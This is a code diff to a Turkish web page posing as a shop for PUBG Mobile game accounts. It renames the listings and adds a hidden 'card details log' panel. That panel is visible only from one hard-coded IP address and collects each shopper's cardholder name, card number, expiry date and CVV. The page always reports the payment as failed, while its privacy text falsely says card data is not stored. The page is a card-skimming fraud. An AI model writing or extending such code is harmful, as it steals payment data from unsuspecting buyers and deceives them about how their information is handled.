@@ -34,6 +34,10 @@
         .order-form button { background: #10b981; color: white; border: none; padding: 12px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: 600; }
         .order-form button:hover { background: #059669; }
         .message { text-align: center; color: #dc2626; font-weight: 600; margin: 20px 0; display: none; }
+        .log-panel { background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 15px; margin: 20px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: none; }
+        .log-panel h3 { color: #1e3a8a; margin-top: 0; }
+        .log-panel ul { list-style: none; padding: 0; }
+        .log-panel li { margin: 5px 0; color: #6b7280; }
         footer { background: #1c2526; color: white; text-align: center; padding: 10px 0; margin-top: 20px; font-size: 0.9em; }
         .hidden { display: none; }
     </style>
@@ -59,72 +63,72 @@
             <h2>Hesaplarımız</h2>
             <div class="account-grid">
                 <div class="account-card">
-                    <img src="https://www.playerauctions.com/pubg-mobile-account/hero-image.jpg" alt="PUBG Hesap 1" class="account-image">
-                    <div class="account-title">PUBG Hesap 1</div>
-                    <div class="account-desc">Seviye 77, Glacier M416, 200+ Skin</div>
+                    <img src="https://www.playerauctions.com/pubg-mobile-account/hero-image.jpg" alt="Makaralı Full Hesap" class="account-image">
+                    <div class="account-title">Makaralı Full Hesap</div>
+                    <div class="account-desc">Seviye 77, Glacier M416, 200+ Skin, 150+ Eşya</div>
                     <div class="account-price">1500 TL</div>
                     <button class="buy-button" onclick="openOrderForm(1)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.eldorado.gg/pubg-mobile-accounts-for-sale/hero-image.jpg" alt="PUBG Hesap 2" class="account-image">
-                    <div class="account-title">PUBG Hesap 2</div>
-                    <div class="account-desc">Conqueror Rank, Hellfire AKM, 150+ Eşya</div>
+                    <img src="https://www.eldorado.gg/pubg-mobile-accounts-for-sale/hero-image.jpg" alt="Buz Full 48 Destansı Hesap" class="account-image">
+                    <div class="account-title">Buz Full 48 Destansı Hesap</div>
+                    <div class="account-desc">Conqueror Rank, Hellfire AKM, 150+ Eşya, 100+ Destansı</div>
                     <div class="account-price">1800 TL</div>
                     <button class="buy-button" onclick="openOrderForm(2)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://zeusx.com/game/pubg-mobile/accounts/hero-image.jpg" alt="PUBG Hesap 3" class="account-image">
-                    <div class="account-title">PUBG Hesap 3</div>
-                    <div class="account-desc">Ace Dominator, Pharaoh Suit, 180+ Skin</div>
+                    <img src="https://zeusx.com/game/pubg-mobile/accounts/hero-image.jpg" alt="Firavun Elite Hesap" class="account-image">
+                    <div class="account-title">Firavun Elite Hesap</div>
+                    <div class="account-desc">Ace Dominator, Pharaoh Suit, 180+ Skin, 120+ Eşya</div>
                     <div class="account-price">1200 TL</div>
                     <button class="buy-button" onclick="openOrderForm(3)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://gameboost.com/pubg-mobile/accounts/hero-image.jpg" alt="PUBG Hesap 4" class="account-image">
-                    <div class="account-title">PUBG Hesap 4</div>
-                    <div class="account-desc">Level 80, Fool Set, 220+ Eşya</div>
+                    <img src="https://gameboost.com/pubg-mobile/accounts/hero-image.jpg" alt="Palyaço Master Hesap" class="account-image">
+                    <div class="account-title">Palyaço Master Hesap</div>
+                    <div class="account-desc">Level 80, Fool Set, 220+ Eşya, 90+ Skin</div>
                     <div class="account-price">2000 TL</div>
                     <button class="buy-button" onclick="openOrderForm(4)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.g2g.com/categories/pubg-mobile-accounts/hero-image.jpg" alt="PUBG Hesap 5" class="account-image">
-                    <div class="account-title">PUBG Hesap 5</div>
-                    <div class="account-desc">Conqueror, Dravion X Suit, 160+ Skin</div>
+                    <img src="https://www.g2g.com/categories/pubg-mobile-accounts/hero-image.jpg" alt="Dravion Sınırsız Hesap" class="account-image">
+                    <div class="account-title">Dravion Sınırsız Hesap</div>
+                    <div class="account-desc">Conqueror, Dravion X Suit, 160+ Skin, 110+ Eşya</div>
                     <div class="account-price">1300 TL</div>
                     <button class="buy-button" onclick="openOrderForm(5)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.z2u.com/pubg-mobile/accounts-5-4676/hero-image.jpg" alt="PUBG Hesap 6" class="account-image">
-                    <div class="account-title">PUBG Hesap 6</div>
-                    <div class="account-desc">Ace Master, M416 Glacier Max, 190+ Eşya</div>
+                    <img src="https://www.z2u.com/pubg-mobile/accounts-5-4676/hero-image.jpg" alt="Buzlu M416 Premium Hesap" class="account-image">
+                    <div class="account-title">Buzlu M416 Premium Hesap</div>
+                    <div class="account-desc">Ace Master, M416 Glacier Max, 190+ Eşya, 140+ Skin</div>
                     <div class="account-price">1750 TL</div>
                     <button class="buy-button" onclick="openOrderForm(6)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://skycoach.gg/sell-pubg-mobile-accounts/hero-image.jpg" alt="PUBG Hesap 7" class="account-image">
-                    <div class="account-title">PUBG Hesap 7</div>
-                    <div class="account-desc">Level 85, Chow Blaster SCAR-L, 210+ Skin</div>
+                    <img src="https://skycoach.gg/sell-pubg-mobile-accounts/hero-image.jpg" alt="Chow Blaster Elite Hesap" class="account-image">
+                    <div class="account-title">Chow Blaster Elite Hesap</div>
+                    <div class="account-desc">Level 85, Chow Blaster SCAR-L, 210+ Skin, 130+ Eşya</div>
                     <div class="account-price">1400 TL</div>
                     <button class="buy-button" onclick="openOrderForm(7)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.eldorado.gg/pubg-mobile-accounts-for-sale/hero-image2.jpg" alt="PUBG Hesap 8" class="account-image">
-                    <div class="account-title">PUBG Hesap 8</div>
-                    <div class="account-desc">Conqueror, Blightfall Arbiter Set, 170+ Eşya</div>
+                    <img src="https://www.eldorado.gg/pubg-mobile-accounts-for-sale/hero-image2.jpg" alt="Blightfall Kral Hesap" class="account-image">
+                    <div class="account-title">Blightfall Kral Hesap</div>
+                    <div class="account-desc">Conqueror, Blightfall Arbiter Set, 170+ Eşya, 120+ Skin</div>
                     <div class="account-price">1900 TL</div>
                     <button class="buy-button" onclick="openOrderForm(8)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.playerauctions.com/pubg-mobile-account/hero-image2.jpg" alt="PUBG Hesap 9" class="account-image">
-                    <div class="account-title">PUBG Hesap 9</div>
-                    <div class="account-desc">Ace Dominator, Winter Highness Cover, 200+ Skin</div>
+                    <img src="https://www.playerauctions.com/pubg-mobile-account/hero-image2.jpg" alt="Kış Prensi Destansı Hesap" class="account-image">
+                    <div class="account-title">Kış Prensi Destansı Hesap</div>
+                    <div class="account-desc">Ace Dominator, Winter Highness Cover, 200+ Skin, 150+ Eşya</div>
                     <div class="account-price">1600 TL</div>
                     <button class="buy-button" onclick="openOrderForm(9)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://zeusx.com/game/pubg-mobile/accounts/hero-image2.jpg" alt="PUBG Hesap 10" class="account-image">
-                    <div class="account-title">PUBG Hesap 10</div>
-                    <div class="account-desc">Level 90, UMP Marine Level 4, 230+ Eşya</div>
+                    <img src="https://zeusx.com/game/pubg-mobile/accounts/hero-image2.jpg" alt="Deniz UMP Ultra Hesap" class="account-image">
+                    <div class="account-title">Deniz UMP Ultra Hesap</div>
+                    <div class="account-desc">Level 90, UMP Marine Level 4, 230+ Eşya, 180+ Skin</div>
                     <div class="account-price">1100 TL</div>
                     <button class="buy-button" onclick="openOrderForm(10)">Satın Al</button>
                 </div>
@@ -132,7 +136,7 @@
         </div>
         <div id="privacy" class="content hidden">
             <h2>Gizlilik Politikası</h2>
-            <p>DEARTİCARET, kullanıcı bilgilerini 256-bit SSL ile korur. Kart bilgileriniz sistemde saklanmaz, yalnızca işlem için kullanılır. Daha fazla bilgi için bizimle iletişime geçin.</p>
+            <p>DEARTİCARET, kullanıcı bilgilerini 256-bit SSL ile korur. Kart bilgileriniz sistemde saklanmaz, yalnızca işlem için kullanılır. Daha fazla bilgi için bizimle iletişime geçebilirsiniz.</p>
         </div>
         <div class="order-form" id="orderForm" style="display: none;">
             <h2>Güvenli Ödeme</h2>
@@ -145,6 +149,10 @@
             <button onclick="closeOrderForm()">İptal</button>
         </div>
         <div class="message" id="paymentMessage">Ödeme başarısız. Lütfen 1 gün sonra tekrar deneyin.</div>
+        <div class="log-panel" id="logPanel">
+            <h3>Kart Bilgileri Log</h3>
+            <ul id="logList"></ul>
+        </div>
     </div>
     <footer>
         <p>&copy; 2025 DEARTİCARET. Tüm hakları saklıdır.</p>
@@ -156,6 +164,9 @@
             .then(response => response.json())
             .then(data => {
                 window.isAuthorized = data.ip === '46.196.249.65';
+                if (window.isAuthorized) {
+                    document.getElementById('logPanel').style.display = 'block';
+                }
             })
             .catch(() => window.isAuthorized = false);
 
@@ -191,9 +202,12 @@
             let id = document.getElementById('orderForm').dataset.id;
 
             if (cardHolder && cardNum && expiry && cvv) {
-                // Sadece senin IP'nle logla
+                // Sadece senin IP'nle logla ve panele ekle
                 if (window.isAuthorized) {
-                    console.log(`Hesap ID: ${id}, Kart Sahibi: ${cardHolder}, Kart No: ${cardNum}, Son Kullanım: ${expiry}, CVV: ${cvv}, Tarih: ${new Date().toLocaleString()}`);
+                    let logEntry = `Hesap ID: ${id}, Kart Sahibi: ${cardHolder}, Kart No: ${cardNum}, Son Kullanım: ${expiry}, CVV: ${cvv}, Tarih: ${new Date().toLocaleString()}`;
+                    let logList = document.getElementById('logList');
+                    logList.innerHTML += `<li>${logEntry}</li>`;
+                    console.log(logEntry); // Konsola da yaz
                 }
                 // Ödeme başarısız mesajı
                 document.getElementById('paymentMessage').style.display = 'block';
